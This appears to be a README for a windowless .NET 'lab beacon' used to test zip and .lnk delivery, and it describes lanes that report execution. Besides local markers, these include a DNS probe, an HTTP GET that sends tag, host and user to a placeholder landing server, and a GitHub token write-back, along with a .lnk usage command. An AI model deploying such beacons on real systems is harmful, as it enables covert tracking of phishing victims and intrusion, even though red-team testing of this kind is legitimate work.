# lab beacon (zip/lnk delivery tests)

beacon.exe — 12,800 B windowless .NET test runner, source: beacon.cs.
Lanes (all outcomes written to local receipts FIRST, exit code always 0):
 1. local markers: %LOCALAPPDATA%\SyncCache\run-<tag>-<ts>.json (+lanes.log)
    and C:\Users\Public\Documents\scan-<tag>-<ts>.txt  <- PROOF OF EXECUTION,
    readable even on a fully offline box.
 2. dns probe:  <tag>.<--dns domain>   (egress through proxy-hostile nets)
 3. GET sink:   --get "<url with {t} {h} {u} {tag}>"  -> your landing logs it
 4. github contents write-back (needs --token/--gh; lab use only, see note)

Usage from a .lnk chain:
  beacon.exe --tag V042 --get "http://YOUR-LANDING/beat?t={tag}&h={h}"

TOKEN NOTE: never bake the owner's classic token into this exe; if lane 4 is
needed in the field, mint a fine-grained PAT with Contents:write on the
receipts repo ONLY and pass it via --token.
